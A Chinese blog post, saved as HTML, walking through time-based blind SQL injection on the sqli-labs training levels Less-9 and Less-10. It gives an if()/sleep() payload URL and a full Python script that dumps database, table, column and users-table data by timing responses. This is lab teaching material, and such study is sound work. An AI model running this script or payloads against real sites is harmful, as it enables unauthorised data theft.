@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>sqli-labs Less9-10 基于时间的盲注 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="sqli-labs,盲注,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>sqli-labs Less9-10 基于时间的盲注</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-04-05
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <blockquote>
+<p><a href="http://43.247.91.228:84/Less-9/" target="_blank" rel="noopener">Less-9</a> </p>
+</blockquote>
+<p>这一关的题目为：<code>GET - Blind - Time based. -  Single Quot</code>,提示了是时间盲注，时间盲注是结合 if 语句和 sleep()函数来判断语句是否正确，下面的URL提交后页面会延迟5秒钟，说明语句执行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-9/?id=1&apos; and if(1=1,sleep(5),0)--+</span><br></pre></td></tr></table></figure>
+<p>这句的意思是如果<code>1=1</code>处的语句正确，就执行`sleep(5) 函数，所以就可以以这个为判断依据，修改Less-8 中的脚本进行注入。</p>
+<h3 id="修改过程"><a href="#修改过程" class="headerlink" title="修改过程"></a>修改过程</h3><p>首先修改<code>check()</code>函数，将之前依据页面内容判断改为根据页面响应时间判断，具体使用到<code>time</code>模块、<code>datetime</code>模块以及<code>requests</code>模块，下面是简单介绍</p>
+<h4 id="time"><a href="#time" class="headerlink" title="time"></a>time</h4><blockquote>
+<p>在 Python 文档里， time 是归类在 Generic Operating System Services 中，换句话说， 它提供的功能是更加接近于操作系统层面的。通读 文档 可知，time 模块是围绕着 Unix Timestamp 进行的。<br> 该模块主要包括一个类 struct_time ，另外其他几个函数及相关常量。 需要注意的是在该模块中的大多数函数是调用了所在平台 C library 的同名函数， 所以要特别注意有些函数是平台相关的，可能会在不同的平台有不同的效果。另外一点是，由于是基于Unix Timestamp，所以其所能表述的日期范围被限定在 1970 - 2038 之间，如果你写的代码需要处理在前面所述范围之外的日期，那可能需要考虑使用 datetime 模块更好。</p>
+</blockquote>
+<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">stramp = time.time()       #获取当前时间戳</span><br><span class="line">time.ctime()               #&apos;Wed Jun 15 11:15:53 2016&apos;</span><br><span class="line">struct = time.locatime()   #获取struct格式的时间</span><br><span class="line">time.mktime(struct)        #把时间戳变成struct格式</span><br><span class="line">time.loctime(stramp)      #把时间戳转换成struct格式，一般可用于把一个float数字转换成struct</span><br><span class="line">time.strftime(&apos;%Y-%m-%d&apos;, time.loctime())    #把struct格式的时间按照给出的格式格式化，类似于datetime.datetime.now().strftime(&apos;%Y-%m-%d&apos;)</span><br></pre></td></tr></table></figure>
+<h4 id="datetime"><a href="#datetime" class="headerlink" title="datetime"></a>datetime</h4><blockquote>
+<p>datetime 基于 time 进行了封装，提供了更多实用的函数。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">datetime.replace(name=value) # 前面所述各项属性是 read-only 的，需要此方法才可更改</span><br><span class="line">datetime.timetuple() # 返回time.struct_time 对象</span><br><span class="line">dattime.strftime(format) # 按照 format 进行格式化输出</span><br><span class="line"></span><br><span class="line">#除了实例本身具有的方法,类本身也提供了很多好用的方法：</span><br><span class="line">datetime.today()a  # 当前时间，localtime</span><br><span class="line">datetime.now([tz]) # 当前时间默认 localtime</span><br><span class="line">datetime.utcnow()  # UTC 时间</span><br><span class="line">datetime.fromtimestamp(timestamp[, tz]) # 由 Unix Timestamp 构建对象</span><br><span class="line">datetime.strptime(date_string, format)  # 给定时间格式解析字符串</span><br><span class="line"></span><br><span class="line"># datetime.timedelta</span><br><span class="line">today = datetime.datetime.today()    #2016-06-15 11:21:00.205354</span><br><span class="line">tomorrow = date + datetime.timedelta(days=1)</span><br><span class="line">next_hour = datetime.datetime.now() + datetime.timedelta(hours=1)</span><br></pre></td></tr></table></figure>
+<p>这里请求网页的方式从</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = request.urlopen(url + parse.quote(newurl)).read().decode()</span><br></pre></td></tr></table></figure>
+<p>改为了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res=requests.get(url +newurl)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>区别</strong></p>
+<p>这里面的区别在于urlopen打开URL网址,url参数可以是一个字符串url或者是一个Request对象,返回的是http.client.HTTPResponse对象.http.client.HTTPResponse对象大概包括read()、readinto()、getheader()、getheaders()、fileno()、msg、version、status、reason、debuglevel和closed函数,其实一般而言使用read()函数后还需要decode()函数,返回的网页内容实际上是没有被解码或的,在read()得到内容后通过指定decode()函数参数,可以使用对应的解码方式。 </p>
+<p>requests.get()方法请求了站点的网址,然后打印出了返回结果的类型,状态码,编码方式,Cookies等内容</p>
+</blockquote>
+<p>修改了这些后，还需要在其他函数构造URL的地方将语句用if括起来并且加上sleep()函数，使URL拼合后类似在本文开头的那种形式，下面是修改后的脚本</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基于时间盲注脚本</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time,datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://43.247.91.228:84/Less-9/?id="</span></span><br><span class="line">right_text=<span class="string">"You are in..........."</span></span><br><span class="line">table_names=[]</span><br><span class="line">cols=[]</span><br><span class="line">data=[]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取名字长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(check_name,limit=<span class="string">""</span>)</span>:</span></span><br><span class="line">	length=<span class="number">0</span>;	</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		newurl=<span class="string">"1' and if(length("</span>+check_name+limit+<span class="string">")="</span>+str(length)+<span class="string">",sleep(2),0)--+"</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment"># print(url+newurl)</span></span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			<span class="keyword">return</span> length</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			length+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取名字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_name</span><span class="params">(namelength,check_name,limit=<span class="string">""</span>)</span>:</span></span><br><span class="line">	name=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(namelength):</span><br><span class="line">		a,b=<span class="number">64</span>,<span class="number">64</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			b=int(b/<span class="number">2</span>)</span><br><span class="line">			newurl=<span class="string">"1' and if(ascii(substr("</span>+check_name+limit+<span class="string">","</span>+str(i+<span class="number">1</span>)+<span class="string">")"</span>+<span class="string">")&lt;"</span>+str(a)+<span class="string">",sleep(2),0)--+"</span></span><br><span class="line">			<span class="comment"># print(url+newurl)</span></span><br><span class="line">			<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">				a-=b</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				newurl=<span class="string">"1' and if(ascii(substr("</span>+check_name+limit+<span class="string">","</span>+str(i+<span class="number">1</span>)+<span class="string">")"</span>+<span class="string">")="</span>+str(a)+<span class="string">",sleep(2),0)--+"</span></span><br><span class="line">				<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">					name+=chr(a)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					a+=b</span><br><span class="line">	<span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取表的数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_nums</span><span class="params">(check_name)</span>:</span></span><br><span class="line">	table_nums=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		limit=<span class="string">" limit "</span>+str(table_nums)+<span class="string">",1"</span></span><br><span class="line">		newurl=<span class="string">"1' and if(ascii(substr("</span>+check_name+limit+<span class="string">"),1))&gt;0"</span>+<span class="string">",sleep(2),0)--+"</span></span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			table_nums+=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> table_nums</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表中列的数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_nums</span><span class="params">(table_name)</span>:</span></span><br><span class="line">	nums=<span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		newurl=<span class="string">"1' and if((select count(*) from information_schema.COLUMNS where table_name='"</span>+str(table_name)+<span class="string">"') ="</span>+str(nums)+<span class="string">",sleep(2),0)--+"</span></span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			<span class="keyword">return</span> nums</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			nums+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取名字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_names</span><span class="params">(check_name,nums,names)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> n  <span class="keyword">in</span> range(nums):</span><br><span class="line">		<span class="comment">#获取长度</span></span><br><span class="line">		limit=<span class="string">" limit "</span>+str(n)+<span class="string">",1)"</span></span><br><span class="line">		length=get_length(check_name,limit)</span><br><span class="line">		<span class="comment"># print("[+]长度为:"+str(length))</span></span><br><span class="line">		<span class="comment">#获取名字</span></span><br><span class="line">		name=guess_name(length,check_name,limit)</span><br><span class="line">		names.append(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取相应表中有多少数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data_nums</span><span class="params">(DBname,table_name,cols)</span>:</span></span><br><span class="line">	nums=<span class="number">0</span></span><br><span class="line">	columns=<span class="number">0</span></span><br><span class="line">	<span class="comment"># 获取有多少列</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		column=cols[<span class="number">0</span>]</span><br><span class="line">		newurl=<span class="string">"1' and if((select count(*) from %s.%s)=%s,sleep(2),0)--+"</span> %(DBname,table_name,nums)</span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			nums+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> nums</span><br><span class="line"><span class="comment"># 获取每一条数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(DBname,table_name,cols,data_nums)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cols)):</span><br><span class="line">		print(<span class="string">"[*] "</span>+cols[i]+<span class="string">"列的数据为:"</span>)</span><br><span class="line">		check_name=<span class="string">" (select %s from security.users "</span> % (cols[i])</span><br><span class="line">		get_names(check_name,data_nums,data)</span><br><span class="line">		<span class="keyword">for</span> n <span class="keyword">in</span> range(data_nums):</span><br><span class="line">			print(<span class="string">"-------"</span>+data[n])</span><br><span class="line">		<span class="keyword">del</span> data[:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(newurl)</span>:</span></span><br><span class="line">	<span class="comment"># print(url+newurl)</span></span><br><span class="line">	time1 = datetime.datetime.now()</span><br><span class="line">	res=requests.get(url +newurl)</span><br><span class="line">	print(url+newurl)</span><br><span class="line">	time2 = datetime.datetime.now()</span><br><span class="line">	sec = (time2 - time1).seconds</span><br><span class="line">	<span class="keyword">if</span> sec&gt;=<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DBnamelength=get_length(<span class="string">"database()"</span>)</span><br><span class="line">print(<span class="string">"[*] 数据库长度为:"</span> + str(DBnamelength))</span><br><span class="line">print(<span class="string">"[+] 开始获取数据库名字"</span>)</span><br><span class="line">DBname=guess_name(DBnamelength,<span class="string">"database()"</span>)</span><br><span class="line"></span><br><span class="line">table_nums=get_table_nums(<span class="string">"(select table_name from information_schema.tables where table_schema=database()"</span>)</span><br><span class="line">print(<span class="string">"[*] 表的数量为:"</span>+str(table_nums))</span><br><span class="line">print(<span class="string">"[+] 开始获取表名"</span>)</span><br><span class="line">get_names(<span class="string">"(select table_name from information_schema.tables where table_schema=database()"</span>,table_nums,table_names)</span><br><span class="line">print(<span class="string">"[+] 开始获取users表的列名"</span>)</span><br><span class="line">column_nums=get_column_nums(<span class="string">"users"</span>)</span><br><span class="line">get_names(<span class="string">"(select column_name from information_schema.columns where table_name='users'"</span>,column_nums,cols)</span><br><span class="line">data_nums=get_data_nums(DBname,<span class="string">"users"</span>,cols)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] 当前数据库名字为:"</span>+ DBname)</span><br><span class="line">print(<span class="string">"[*] 表的数量为:"</span>+str(table_nums))</span><br><span class="line">print(<span class="string">"[*] 所有表的名字为:"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table_nums):</span><br><span class="line">	print(<span class="string">"		"</span>+table_names[i])</span><br><span class="line">print(<span class="string">"[*] users表一共有"</span>+str(column_nums)+<span class="string">"列"</span>)</span><br><span class="line">print(<span class="string">"[*] users表下所有列的名字为"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(column_nums):</span><br><span class="line">	print(<span class="string">"		"</span>+cols[i])</span><br><span class="line">	</span><br><span class="line">get_data(DBname,<span class="string">"users"</span>,cols,data_nums)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a href="http://43.247.91.228:84/Less-10/" target="_blank" rel="noopener">Less-10</a> </p>
+</blockquote>
+<p>这一关的名字为:<code>GET - Blind - Time based. -  Double Quot</code>，经过尝试，这个和第九关的区别就是这一关是使用双引号闭合，所以将脚本中的单引号改为双引号就行了</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>修改为基于时间的盲注脚本并不复杂，但是需要把握好sleep()函数的时间，如果过小会使得脚本运行过慢，但是时间设置的太短，会使出错的概率变大，所以这个地方需要根据自己的情况设定。</p>
+<blockquote>
+<p> <em>参考</em></p>
+<p><a href="https://www.jianshu.com/p/779f5f128caa" target="_blank" rel="noopener">Python中的time和datetime模块</a></p>
+</blockquote>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/bf579251.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/sqli-labs/">
+              #sqli-labs
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/盲注/">
+              #盲注
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/4a1095d8.html" target="_self">sqli-labs8 编写脚本进行注入</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/bf579251.html" target="_self">sqli-labs Less9-10 基于时间的盲注</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
